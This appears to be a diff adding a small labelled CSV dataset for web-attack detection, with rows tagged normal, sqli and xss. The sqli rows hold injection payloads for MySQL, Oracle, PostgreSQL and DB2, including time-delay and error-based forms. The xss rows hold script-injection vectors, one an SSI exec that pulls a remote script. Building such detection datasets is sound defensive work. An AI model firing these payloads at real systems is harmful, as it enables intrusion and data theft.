@@ -1,0 +1,25 @@
+﻿類別,來源紀錄起始行,payload,commit
+normal,26099,24142,926670a710283f87c05b554680facf3f9530548c
+normal,20475,15318,926670a710283f87c05b554680facf3f9530548c
+normal,5670,villafranca del bierzo,926670a710283f87c05b554680facf3f9530548c
+normal,6742,degeistirk@meneamex.pr,926670a710283f87c05b554680facf3f9530548c
+normal,6788,"calle olivos de pea nevada, 124,",926670a710283f87c05b554680facf3f9530548c
+normal,20558,sobrecogimiento,926670a710283f87c05b554680facf3f9530548c
+normal,6767,barrenechea sadurn,926670a710283f87c05b554680facf3f9530548c
+normal,9191,1190044863777145,926670a710283f87c05b554680facf3f9530548c
+sqli,16818,"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",926670a710283f87c05b554680facf3f9530548c
+sqli,30088,"-4194""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ddbc"" like ""ddbc",926670a710283f87c05b554680facf3f9530548c
+sqli,11806,"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf",926670a710283f87c05b554680facf3f9530548c
+sqli,29904,"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",926670a710283f87c05b554680facf3f9530548c
+sqli,15192,"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",926670a710283f87c05b554680facf3f9530548c
+sqli,14629,"1"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""cyyh""=""cyyh",926670a710283f87c05b554680facf3f9530548c
+sqli,29106,"1' where 9961=9961 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",926670a710283f87c05b554680facf3f9530548c
+sqli,14761,"1""));select count(*) from generate_series(1,5000000)--",926670a710283f87c05b554680facf3f9530548c
+xss,30690,"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",926670a710283f87c05b554680facf3f9530548c
+xss,30580,><img id=xss src=x onerror=alert(xss);>,926670a710283f87c05b554680facf3f9530548c
+xss,30965,"<xml id=xss><x><c><![cdata[<img id=xss src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x><xml><span dataid=xss src=#i datafld=cdataformatas=html></span>",926670a710283f87c05b554680facf3f9530548c
+xss,30866,"-1<img src=""blah""onmouseover=""document.cookie=true;"">",926670a710283f87c05b554680facf3f9530548c
+xss,30750,">""<input type=""image"" src=""javascript:document.cookie=true;"">",926670a710283f87c05b554680facf3f9530548c
+xss,30880,"><script>alert(""vlab"")</script>",926670a710283f87c05b554680facf3f9530548c
+xss,30890,"<!--#exec cmd=""/bin/echo '<scr'""--><!--#exec cmd=""/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'""-->",926670a710283f87c05b554680facf3f9530548c
+xss,2379,open()>,926670a710283f87c05b554680facf3f9530548c
